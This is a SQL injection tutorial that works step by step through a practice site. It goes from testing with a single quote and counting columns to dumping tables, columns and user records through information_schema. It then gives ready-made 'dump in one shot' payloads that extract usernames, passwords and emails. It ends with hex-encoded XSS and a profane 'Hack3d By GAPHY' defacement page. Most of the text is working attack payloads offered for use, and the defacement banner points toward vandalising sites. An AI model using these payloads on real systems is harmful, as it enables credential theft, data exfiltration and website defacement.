SQL injection Attack from basic to advance

STEP 1: Testing for vulnerability

- Visting the website 
- Let us add single quote "'" to an existing URL to check whether the website is vulnerable to SQLI.
    - http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1'
    
STEP 2: Columns Count
 
it is time to have a conversation with the database to find the number of columns.
To enumerate columns we can use order by command.
   ``` - http://leettime.net/sqlninja.com/tasks/basic_ch1.php?id=1 order by 1-- ```

STEP 3: Finding the Vulnerability Column(s)

SQL backend may contain more Tables names with empty data also.Therefore You should first able to find out which table names are present in this 3 columns.
Now we can select all 3 columns with "union all select"
    
STEP 4: Checking the datatbase version, name and host name

We already knew the location of our vulnerable column(s) , so will directly ask database name, version etc
"version(),database(),user()"

STEP 5: Dumping Database Tables

Group_concat() is the function returns a string with the concatenated non-NULL value from a group.
So we can use this Function to list all Tables from the database.
In Addition, we can use Information_Schema to view metadata about the objects within a database.
"group_concat(table_name) from information_schema.tables where table_schema=database()--+"


STEP 6: Dumping Columns

we are set to read columns in the table
"group_concat(column_name) from information_schema.columns where table_name='users'--+"

STEP 7: Dumping details in the user column 
	Final Stage	
	"group_concat(user) from users--+"
	

# Advance SQLi

Dump in one shot:

this version of dump in one shot(DIOS) was created by myself and a friend "cyberuser"

(select(@x)from(select(@x:=0x00),(select(0)from(information_schema.columns)where(table_schema!=0x696e666f726d6174696f6e5f736368656d61)and(0x00)in(@x:=concat(@x,0x3c62723e,table_schema,0x3d3d3e,table_name,0x3d3d3e,column_name))))x)

(select%20(@)%20from%20(select(@:=0x00),(select%20(@)%20from%20(users)%20where%20(@)in%20(@:=concat(@,0x3C,0x62,0x72,0x3E,user,0x3d3d3e,pass,0x3d3d3e,id,0x3d3d3e,email))))a)

```bash
<script>alert('gaphy was here');</script> : 0x3c7363726970743e616c6572742827676170687920776173206865726527293b3c2f7363726970743e 
```

```bash
<div align="center" class="shdw">Hack3d By GAPHY</div><br /><div align="center">
<center><br>
<marquee direction="UP" width="500" height="300"><center>
<font face="Courier New">
<h2>.:: GAPHY ::.</h2>
.............<br><br><br><b>
...................<br><br>
............<br><br>
...............<br><br>
Admin your security Was Fucked!!<br><br>
............<br><br>

</b></b></font></center><font face="Courier New"><b><b>
</b></b></font></marquee>
0x3c64697620616c69676e3d2263656e7465722220636c6173733d2273686477223e4861636b33642042792047415048593c2f6469763e3c6272202f3e3c64697620616c69676e3d2263656e746572223e0d0a3c63656e7465723e3c62723e0d0a3c6d61727175656520646972656374696f6e3d225550222077696474683d2235303022206865696768743d22333030223e3c63656e7465723e0d0a3c666f6e7420666163653d22436f7572696572204e6577223e0d0a3c68323e2e3a3a204741504859203a3a2e3c2f68323e0d0a2e2e2e2e2e2e2e2e2e2e2e2e2e3c62723e3c62723e3c62723e3c623e0d0a2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e3c62723e3c62723e0d0a2e2e2e2e2e2e2e2e2e2e2e2e3c62723e3c62723e0d0a2e2e2e2e2e2e2e2e2e2e2e2e2e2e2e3c62723e3c62723e0d0a41646d696e20796f757220736563757269747920576173204675636b656421213c62723e3c62723e0d0a2e2e2e2e2e2e2e2e2e2e2e2e3c62723e3c62723e0d0a0d0a3c2f623e3c2f623e3c2f666f6e743e3c2f63656e7465723e3c666f6e7420666163653d22436f7572696572204e6577223e3c623e3c623e0d0a3c2f623e3c2f623e3c2f666f6e743e3c2f6d6172717565653e
```
